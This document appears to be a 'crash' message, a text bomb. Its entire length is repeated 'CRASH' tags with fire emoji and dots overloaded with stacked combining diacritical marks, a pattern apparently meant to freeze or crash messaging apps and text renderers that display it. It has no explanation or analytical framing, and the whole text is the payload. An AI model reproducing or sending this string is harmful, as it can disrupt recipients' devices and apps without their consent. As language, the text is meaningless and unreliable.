̶̢̮͎̘͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.̶̸͇̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮͛͒̄ͨ͊̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̶̢̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌̚͞͝͝ͅ.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̨͢͝